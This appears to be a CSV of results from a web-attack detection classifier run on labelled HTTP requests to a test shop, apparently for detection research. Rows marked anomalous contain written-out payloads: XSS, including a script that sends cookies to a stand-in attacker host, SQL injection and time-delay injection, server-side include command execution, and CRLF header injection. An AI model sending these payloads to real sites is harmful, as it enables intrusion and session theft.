Predicted,Actual,Confidence,Method,Content,URL
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0,Normal,98.54%,GET,,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
1,Anomalous,99.15%,POST,modo=registro&login=gavens0&password=revirado&nombre=Kaya&apellidos=Mojeda+Batet&email=munshin%40cirugiaplasticacordoba.hk&dni=65532112Y&direccion=Plaza+Flauta+16%2C+1%3FBbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&ciudad=Valdeavellano+de+Tera&cp=08672&provincia=Teruel&ntc=2452355001922764&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1,Anomalous,98.37%,POST,id=1&nombre=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&precio=100&cantidad=15&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0,Normal,89.65%,POST,modo=entrar&login=bouchard&pwd=6h11a3rud9&remember=off&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0,Normal,98.86%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
1,Anomalous,98.42%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ovas%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&pwd=ric8Me6te&remember=on&B1=Entrar HTTP/1.1
1,Anomalous,98.52%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=291&B1A=Pasar+por+caja HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
1,Anomalous,99.24%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1
1,Anomalous,98.86%,POST,B2A=Vaciar+carrito,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
1,Anomalous,98.99%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&cantidad=66&B1=A%F1adir+al+carrito HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080/IISSamples/sdk/asp/applications/Application_JScript.asp HTTP/1.1
1,Anomalous,99.53%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
1,Anomalous,86.08%,POST,modo=entrar&login=cadtools&pwdA=hirco&remember=on&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0,Normal,98.96%,GET,,http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
1,Anomalous,99.33%,POST,idA=1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0,Normal,67.82%,POST,modo=registro&login=schuett&password=731a*n8&nombre=Lidia&apellidos=Claudio+Iturrieta&email=schoelen.boswell%40phd-photodecor.ca&dni=30802142J&direccion=Passeig+Desert+180%2C+&ciudad=Ig%FCe%F1a&cp=08573&provincia=Pontevedra&ntc=5150525226219774&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0,Normal,81.05%,POST,modo=registro&login=caryl&password=t53S97L%C1n747A&nombre=Randy&apellidos=Pardo+Vidriales&email=greco_manon1%40hacia.yu&dni=70289546M&direccion=Cartago+117%2C+12%3FB&ciudad=Tr%E9vago&cp=47131&provincia=La+Rioja&ntc=4970113242543246&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
1,Anomalous,98.86%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
0,Normal,97.64%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
1,Anomalous,92.73%,GET,,http://localhost:8080/tienda1.Bak HTTP/1.1
1,Anomalous,99.15%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=willy&password=c53p7t25064&nombre=Aidano&apellidos=Pujos+Janeiro&email=eberle%40baybay.tg&dni=85025185G&direccion=De+La+Vega+4%2C+&ciudad=Casasimarro&cp=21340&provincia=A+Coru%F1a&ntc=7642131917731646&B1A=Registrar HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
1,Anomalous,99.00%,GET,,http://localhost:8080/tienda1/publico/productos.jsp/6909030637832563290.jsp.old HTTP/1.1
0,Normal,98.81%,GET,,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
1,Anomalous,92.73%,GET,,http://localhost:8080/tienda1.Bak HTTP/1.1
1,Anomalous,71.90%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ginsberg&pwd=s33ler%271&remember=on&B1=Entrar HTTP/1.1
0,Normal,98.73%,POST,modo=insertar&precio=2403&B1=Confirmar,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1,Anomalous,85.48%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?idA=2&nombre=Vino+Rioja&precio=39&cantidad=28&B1=A%F1adir+al+carrito HTTP/1.1
1,Anomalous,98.86%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
0,Anomalous,80.65%,POST,modo=registro&login=sarge&password=apad-r8nad5ra&nombre=Adolfina&apellidos=Sanmarti+Challiol&email=paolieri%40cubiertoscbb.gu&dni=55702502K&direccion=Pla%E7a+Carrasco+i+Formiguera+163%2C+&ciudad=Saelices+de+Mayorga&cp=3379A&provincia=Valencia&ntc=1427980931123468&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,98.76%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0,Normal,76.63%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rosana&password=gaRrOch_isTa&nombre=Fresia&apellidos=Mantero+Gudall&email=lierde.vaverka%402horas.wf&dni=09085572C&direccion=Pla%E7a+De+Bandes+De+Musica+De+La+Comunitat+Valenciana%2C+90+2-H&ciudad=Nogueira+de+Ramu%EDn&cp=33455&provincia=Toledo&ntc=1992808528259508&B1=Registrar HTTP/1.1
1,Anomalous,99.56%,POST,B2=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
1,Anomalous,99.07%,GET,,http://localhost:8080/admin/logon.jsp HTTP/1.1
1,Anomalous,98.56%,POST,modo=registro&login=vanderbi&password=brechar&nombre=Rudolph&apellidos=Simo+Baixaul%ED&email=guarneros%40elfisioencasa.eu&dni=07929654J&direccion=D%27+Irlanda%2C+150%2C+4G&ciudadA=Cru%EFlles%2C+Monells+i+Sant+Sadurn%ED+de+l%27Heura&cp=22362&provincia=Palencia&ntc=7146200335863301&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1,Anomalous,98.23%,POST,modo=entrar&login=salomo&pwd=cap2taz3&remember=off%22+AND+%221%22%3D%221&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,99.23%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
0,Normal,99.23%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
1,Anomalous,96.99%,POST,modo=insertar&precioA=8659&B1=Pasar+por+caja,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1,Anomalous,97.82%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hisko&pwd=misionera&remember=off&B1=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2 HTTP/1.1
0,Normal,81.64%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=leah&password=p%2BLANeadOr&nombre=Deborah&apellidos=Molero+Bubnjar&email=throne%40familiamarino.cl&dni=76951358M&direccion=Calle+Carlos+Arniches+173+&ciudad=Pinofranqueado&cp=16878&provincia=Cuenca&ntc=5956754565750791&B1=Registrar HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
0,Normal,99.23%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
0,Normal,97.64%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
0,Normal,98.66%,GET,,http://localhost:8080/tienda1/index.jsp HTTP/1.1
0,Normal,98.58%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7785&B1=Confirmar HTTP/1.1
1,Anomalous,96.46%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=aloise&password=aspa&nombre=Galindo&apellidos=Lafont+Vi%F1alon&email=pereda%40streaptease.nr&dni=97294031Y&direccion=Calle+Toledo+145+&ciudad=Baronia+de+Rialb%2C+La&cp=45870&provincia=Ourense&ntc=2811052158631771&B1A=Registrar HTTP/1.1
1,Anomalous,97.26%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=maijala&pwd=indiv%21idualmente%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&remember=on&B1=Entrar HTTP/1.1
0,Normal,98.86%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080/CFIDE/administrator/logout.cfm HTTP/1.1
1,Anomalous,99.98%,POST,modo=registro&login=schaffel3&password=5ub9ltern3nte&nombre=Teinad&apellidos=Agraso+Feixas&email=callam%40mtos.by&dni=32857731T&direccion=C%2F+Leon+Felipe%2C+31+&ciudad=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&cp=44589&provincia=Palencia&ntc=4714732630974118&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080/asf-logo-wide.gif/ HTTP/1.1
0,Normal,97.57%,POST,modo=insertar&precio=1972&B1=Pasar+por+caja,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1,Anomalous,99.69%,POST,modo=entrarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&login=popel&pwd=descomPaginar&remember=off&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,98.96%,GET,,http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
1,Anomalous,99.40%,POST,id=1%2F&nombre=Queso+Manchego&precio=100&cantidad=76&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
1,Anomalous,99.02%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6715&B1=Confirmar%2F HTTP/1.1
0,Normal,87.89%,POST,modo=registro&login=amlani&password=c4oat5&nombre=Clodomiro&apellidos=Muntan%E9+Pros&email=solter%40aclub.com.ke&dni=81470918L&direccion=Estret+De+Sant+Nicolau+S%2FN+&ciudad=Begur&cp=03400&provincia=Burgos&ntc=1563947873431208&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
1,Anomalous,86.04%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mirella&pwd=2anc580a95r&rememberA=off&B1=Entrar HTTP/1.1
1,Anomalous,99.10%,POST,modo=registro&login=gib&password=3L29stRE&nombre=Yarav%ED&apellidos=Pa%F1ella+Villasev&email=switzer%40grandesinventos.pt&dni=04831932T&direccion=C%2F+Rio+San+Lorenzo%2C+125%2C+10%3FC&ciudad=Alegr%EDa-Dulantzi&cp=34170&provincia=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&ntc=3029147558638309&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0,Normal,98.86%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
1,Anomalous,98.86%,POST,B2A=Vaciar+carrito,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
0,Normal,98.96%,POST,errorMsg=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1,Anomalous,99.23%,POST,errorMsgA=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1,Anomalous,98.86%,POST,B2A=Vaciar+carrito,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
0,Normal,98.73%,POST,modo=insertar&precio=8516&B1=Confirmar,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1,Anomalous,98.44%,GET,,http://localhost:8080/tienda1/asf-logo-wide.gif HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
1,Anomalous,99.02%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8305&B1=Confirmar%2F HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0,Normal,94.88%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=73&B1=A%F1adir+al+carrito HTTP/1.1
0,Normal,78.99%,POST,modo=registro&login=triggian&password=96TO3a38&nombre=Gloria&apellidos=Francino+Llosa&email=debicki%40prestoesesto.hr&dni=75010741J&direccion=C%2F+Barrio+De+Recuesto%2C+195+6-H&ciudad=Chipiona&cp=16312&provincia=Lleida&ntc=8099861085079421&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,94.88%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=82&B1=A%F1adir+al+carrito HTTP/1.1
1,Anomalous,99.87%,POST,B2=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
1,Anomalous,99.79%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
1,Anomalous,98.38%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertarparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=8145&B1=Confirmar HTTP/1.1
1,Anomalous,99.25%,POST,id=2%27OR%27a%3D%27a,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0,Normal,89.65%,POST,modo=entrar&login=burg&pwd=6u33a&remember=on&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,89.65%,POST,modo=entrar&login=cas&pwd=82pe6m77b57i0a%2Bd&remember=on&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1,Anomalous,99.07%,GET,,http://localhost:8080/compass/logon.jsp HTTP/1.1
0,Normal,98.66%,GET,,http://localhost:8080/tienda1/index.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
1,Anomalous,98.12%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp/asf-logo-wide HTTP/1.1
0,Normal,97.64%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080/_cti_pvt/linkinfo.cnf HTTP/1.1
1,Anomalous,98.74%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=%27OR%27a%3D%27a&B1=A%F1adir+al+carrito HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
0,Normal,98.66%,GET,,http://localhost:8080/tienda1/index.jsp HTTP/1.1
1,Anomalous,98.65%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&B1=Confirmar HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080/CFIDE/administrator/tabs.cfm HTTP/1.1
1,Anomalous,99.53%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Set-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
1,Anomalous,99.31%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=janey&password=3s3%27+AND+%271%27%3D%271&nombre=Candela&apellidos=Bote+Montijo&email=despotovich.thalbach%40easyviaggio.by&dni=06425800Z&direccion=Ronda+Del+General+Mitre+S%2FN%2C+&ciudad=Porto+do+Son&cp=17143&provincia=Palencia&ntc=8776652546820108&B1=Registrar HTTP/1.1
0,Normal,98.96%,POST,errorMsg=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1,Anomalous,98.96%,POST,id=1bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
1,Anomalous,99.02%,POST,modo=insertar&precio=4135&B1=Confirmar%2F,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
0,Normal,98.66%,GET,,http://localhost:8080/tienda1/index.jsp HTTP/1.1
1,Anomalous,99.23%,POST,errorMsgA=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080.Inc HTTP/1.1
1,Anomalous,99.87%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dunlap&password=d5s3748dA&nombre=Walerico&apellidos=Bartra+Bergu%EDo&email=luca8%40mobilecrm.iq&dni=41944054N&direccion=Pla%E7a+Don+Ramon+Serrano+Su%F1er%2C+S%2FN+&ciudad=Antig%FCedadany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&cp=09610&provincia=Madrid&ntc=2664915448366606&B1=Registrar HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
0,Normal,94.88%,POST,id=3&nombre=Vino+Rioja&precio=39&cantidad=13&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0,Normal,81.64%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=eward&password=%24despumar&nombre=Rory&apellidos=Naredo+Reggiardo&email=korey_molina%40juguetespersonales.gob&dni=37068097D&direccion=Calle+Fausto+Fraile+0+&ciudad=Aracena&cp=17256&provincia=Palencia&ntc=3362439041972349&B1=Registrar HTTP/1.1
0,Normal,98.58%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=812&B1=Confirmar HTTP/1.1
0,Normal,97.64%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
0,Normal,89.85%,POST,modo=registro&login=amalie&password=arlota&nombre=Fulivio&apellidos=M%F3nico+Echeverr%EDa&email=gossett%40conac.com.li&dni=42093532J&direccion=C%2F+Caceres%2C+74%2C+&ciudad=Estollo&cp=22400&provincia=Tarragona&ntc=0894971274673122&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0,Normal,98.96%,GET,,http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
0,Normal,98.96%,POST,errorMsg=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
0,Normal,81.64%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=chiykows&password=93tIp72ar&nombre=Wara&apellidos=Caball%E9&email=beverly.lormer%40decobiombo.ni&dni=81037080F&direccion=Particular+Basterra+108+&ciudad=Berriz&cp=47882&provincia=Zamora&ntc=7984505831107491&B1=Registrar HTTP/1.1
0,Normal,98.96%,GET,,http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
0,Normal,97.57%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=750&B1=Pasar+por+caja HTTP/1.1
0,Normal,78.28%,POST,modo=registro&login=michele6&password=e4te9ad2&nombre=Pascual&apellidos=Ure%F1a+Bernat&email=caine%40albeiteria.es&dni=50645313A&direccion=Camino+Ermita+De+La+Torre%2C+129%2C+&ciudad=Cretas&cp=28815&provincia=Lleida&ntc=5564387106032585&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1,Anomalous,99.77%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&loginA=emelia7&password=e6u*ipolado&nombre=Gelsomino&apellidos=Medio+Bullones&email=radzum_noriega%40alcantarapartners.hr&dni=15508885P&direccion=C%2F+Cadernera%2C+180%2C+5%3FC&ciudad=B%F3veda&cp=06360&provincia=La+Rioja&ntc=3331042207803695&B1=Registrar HTTP/1.1
1,Anomalous,98.44%,GET,,http://localhost:8080/tienda1/asf-logo-wide HTTP/1.1
1,Anomalous,99.24%,POST,B2=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
1,Anomalous,78.39%,POST,id=1&nombre=Vino+Rioja&precio=100&cantidad=%252B&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1,Anomalous,98.34%,POST,modoA=insertar&precio=1764&B1=Pasar+por+caja,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080.BAK HTTP/1.1
1,Anomalous,99.27%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
1,Anomalous,99.20%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=nazanin&password=_colear&nombre=Washingt%2Bon&apellidos=Collantes+Cartaya&email=nieva%40menorca.com.sz&dni=24778234N&direccion=Masia+Can+Mas+Carren%E7a%2C+193%2C+6-F&ciudad=Huerta+del+Marquesado&cp=30360&provincia=Castell%F3n&ntc=5326981690610617&B1=Registrar HTTP/1.1
0,Normal,97.99%,GET,,http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
1,Anomalous,99.99%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E HTTP/1.1
0,Normal,98.67%,GET,,http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
0,Normal,98.76%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
0,Normal,97.99%,GET,,http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
0,Normal,73.21%,POST,modo=registro&login=fikis8&password=apret%F3n&nombre=Crisp%EDn&apellidos=Legarreta+Sant&email=carlo_salcedo4%40nomao.wf&dni=42520233H&direccion=Calle+Sant+Erasme%2C+81+&ciudad=Enc%EDo&cp=37217&provincia=Burgos&ntc=0184493259280421&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1,Anomalous,97.87%,POST,id=1&nombre=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&precio=85&cantidad=22&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0,Anomalous,81.05%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=proulx&password=d1sme43z8r&nombre=Crescencio&apellidos=Berg%E9+Giralt&email=duch%40in%40%40enmallorca.com.ki&dni=42641360G&direccion=Grupos+Jose+Antonio%2C+7+&ciudad=Mozota&cp=48640&provincia=C%E1ceres&ntc=7871877495462595&B1=Registrar HTTP/1.1
0,Normal,91.09%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jemie&password=BisuntA&nombre=Floriana&apellidos=Borb%F3n+Bascomta&email=ballista%40kpincentives.sa&dni=35210254Z&direccion=C%2F+Australia+85%2C+&ciudad=Tierga&cp=22147&provincia=Sevilla&ntc=5010003702753512&B1=Registrar HTTP/1.1
1,Anomalous,98.76%,POST,idA=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=47&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1,Anomalous,99.69%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080/asf-logo-wide.gif HTTP/1.1
